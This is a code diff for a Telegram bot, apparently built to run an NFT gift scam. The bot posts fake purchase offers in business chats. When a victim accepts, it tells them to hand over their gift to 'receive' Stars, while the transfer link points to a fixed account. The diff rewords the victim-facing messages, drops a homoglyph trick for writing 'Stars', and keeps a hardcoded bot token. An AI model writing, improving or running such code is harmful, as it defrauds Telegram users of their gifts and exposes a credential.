@@ -21,7 +21,6 @@ BOT_TOKEN = "8896265487:AAHqtRXlVytqFHMZE7xUOaWZs6WmPFdLbvk"
 NFT_TRANSFER_LINK = "tg://send_gift?to=dobrks"
 ADMIN_ID = 7875607629
 
-# Premium emoji IDs
 EMOJI_GIFT = "5875180111744995604"
 EMOJI_CHECK = "5776375003280838798"
 EMOJI_CROSS = "5778527486270770928"
@@ -62,9 +61,6 @@ async def on_business_conn(conn: BusinessConnection):
     save_connections()
     print(f"[BIZ] {conn.user.first_name} @{conn.user.username}")
 
-def get_buyer_name(conn_id: str) -> str:
-    return connections.get(conn_id, {}).get("first_name") or "User"
-
 def format_amount(value: str) -> str:
     try:
         return f"{int(value):,}"
@@ -72,7 +68,7 @@ def format_amount(value: str) -> str:
         return value
 
 def mask_stars(currency: str) -> str:
-    return "Ѕtаrѕ" if currency.lower() == "stars" else currency.capitalize()
+    return "Stars" if currency.lower() == "stars" else currency.capitalize()
 
 SLUG_RE = re.compile(r"^([A-Za-z][A-Za-z0-9_\-]*?)-(\d+)$")
 
@@ -111,7 +107,8 @@ async def cmd_rep(message: types.Message):
         "business_connection_id": message.business_connection_id,
     }
 
-    buyer = get_buyer_name(message.business_connection_id)
+    # Берём имя того, кто написал команду
+    buyer = message.from_user.first_name or "User"
     nft_link = f'<a href="{nft_url}">{nft_name} #{nft_num:,}</a>'
     preview = f'<a href="{nft_url}">&#8203;</a>'
 
@@ -148,7 +145,7 @@ async def on_accept(cb: CallbackQuery):
 
     offer["status"] = "accepted"
     await cb.answer(
-        f"Предложение принято.\n\nПередайте подарок для получения {offer['amount']} {mask_stars(offer['currency'])}.",
+        f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {mask_stars(offer['currency'])} на ваш баланс.",
         show_alert=True
     )
 
